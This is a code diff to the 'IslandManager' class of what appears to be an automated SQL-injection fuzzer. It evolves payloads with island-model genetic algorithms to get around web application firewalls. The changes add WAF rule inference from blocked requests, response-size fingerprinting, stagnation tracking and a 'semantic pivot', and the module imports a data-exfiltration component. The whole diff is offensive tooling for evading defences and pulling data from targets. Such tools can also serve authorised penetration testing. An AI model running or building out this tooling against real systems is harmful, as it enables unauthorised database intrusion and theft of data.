@@ -9,6 +9,7 @@ from core.error_refiner import SQLErrorRefiner
 from core.differential_analyzer import DifferentialAnalyzer
 from core.payload_minimizer import PayloadMinimizer
 from core.data_exfiltrator import DataExfiltrator
+from core.waf_rule_inferrer import WAFRuleInferrer
 from utils.success_validator import SuccessValidator
 
 class IslandManager:
@@ -30,9 +31,12 @@ class IslandManager:
         self.diff_analyzer = DifferentialAnalyzer(client)
         self.minimizer = PayloadMinimizer(client, self.validator)
         self.exfiltrator = DataExfiltrator(client, self.validator)
+        self.rule_inferrer = WAFRuleInferrer(client)
         self.session_tested = set() # Avoid repeating in same session
+        self.session_scores = {} # Track payload -> score for backtracking
         self.current_gen = 0
         self.waf_info = {"name": "GENERIC / UNKNOWN", "probed": False, "blocked_chars": []}
+        self.baseline_response = None # For fingerprinting
         
         # Initialize Islands with their own mutators and populations
         self.islands = []
@@ -148,14 +152,7 @@ class IslandManager:
         for island, island_results in island_results_list:
             if island_results["max_score"] > global_max_score:
                 global_max_score = island_results["max_score"]
-            
-            # Track island-specific stagnation
-            if island_results["max_score"] <= island["best_score"]:
-                island["stagnation"] += 1
-            else:
-                island["stagnation"] = 0
-                island["best_score"] = island_results["max_score"]
-
+        
         # 2. Migration Step: Every 5 generations, exchange genetic material
         if gen_num > 0 and gen_num % 5 == 0:
             self._migrate()
@@ -271,12 +268,34 @@ class IslandManager:
                         "blocked_chars": self.waf_info["blocked_chars"]
                     })
 
-            score, status = self.validator.validate(response['text'], response['status'])
+            # 1.1 Baseline Initialization (Idea #3)
+            if self.baseline_response is None and response['status'] == 200:
+                self.baseline_response = {
+                    "size": response.get("size", 0),
+                    "word_count": response.get("word_count", 0)
+                }
+                print(f"[*] Fingerprinting: Baseline established (Size: {self.baseline_response['size']}, Words: {self.baseline_response['word_count']})", flush=True)
+
+            score, status = self.validator.validate(
+                response['text'], 
+                response['status'], 
+                size=response.get("size", 0), 
+                word_count=response.get("word_count", 0),
+                baseline=self.baseline_response
+            )
             
             # 2. Learning from real blocks
             if score <= 0.1:
                 self.blocker.learn_from_block(payload)
                 
+                # 2.1 WAF Rule Inference (10% chance when blocked)
+                if (status == "WAF_BLOCKED" or response['status'] in [403, 406]) and random.random() < 0.1:
+                    rule = self.rule_inferrer.infer(payload)
+                    if rule:
+                        # Broadcast inferred rule to all islands
+                        for isl in self.islands:
+                            isl["mutator"].apply_hint({"inferred_rule": rule})
+
                 # Differential Bisection Analysis (20% chance to avoid slowing down)
                 if (status == "WAF_BLOCKED" or response['status'] in [403, 406]) and random.random() < 0.2:
                     signature = self.diff_analyzer.analyze(payload)
@@ -307,7 +326,11 @@ class IslandManager:
             print(f"  [Island {island['id']}] {i+1}/{len(pop)}: {payload[:30]}... [{score:.2f} | {status}]", flush=True)
             
             parent = parents.get(payload)
+            self.session_scores[payload] = score
             self.exp_manager.save_attempt(payload, score, status, parent_payload=parent)
+            
+            # Pass parent score for negative learning
+            parent_score = self.session_scores.get(parent, 0) if parent else 0
             mutator.report_success(payload, score)
             scored_population.append((payload, score, error_msg))
             
@@ -349,6 +372,22 @@ class IslandManager:
 
         # Next Gen for this island
         scored_population.sort(key=lambda x: x[1], reverse=True)
+        
+        # Stagnation Tracking
+        if max_score <= island.get("last_max_score", 0):
+            island["stagnation"] = island.get("stagnation", 0) + 1
+        else:
+            island["stagnation"] = 0
+            island["last_max_score"] = max_score
+
+        # Semantic Pivot Trigger (Idea #2)
+        if island["stagnation"] >= 5:
+            print(f"  [!] Island {island['id']} Stagnated. Triggering Semantic Pivot...", flush=True)
+            # Pivot the elites to a new strategy
+            pivot_payload = mutator.semantic_pivot(scored_population[0][0])
+            scored_population.insert(0, (pivot_payload, 0.1, None))
+            island["stagnation"] = 0 # Reset after pivot
+
         elites = [p[0] for p in scored_population[:max(1, int(self.island_pop_size * 0.2))]]
         survivors = [p for p in scored_population if p[1] >= 0.15]
         
@@ -391,10 +430,14 @@ class IslandManager:
                 p1, p2 = random.sample(survivors, 2)
                 child = self._crossover(p1[0], p2[0])
                 mutated, recipe = mutator.mutate(child, intensity=intensity, response_time=response_time)
+                # Track mutation history for learning
+                mutator.mutation_history[mutated] = {"strategy": "crossover", "parent_score": p1[1]}
                 next_gen.append({"payload": mutated, "parent": p1[0], "recipe": recipe})
             else:
                 parent_data = random.choice(survivors)
                 child, recipe = mutator.mutate(parent_data[0], error_msg=parent_data[2], intensity=intensity, response_time=response_time)
+                # Track mutation history for learning
+                mutator.mutation_history[child] = {"strategy": recipe[-1] if recipe else "unknown", "parent_score": parent_data[1]}
                 next_gen.append({"payload": child, "parent": parent_data[0], "recipe": recipe})
         
         return next_gen
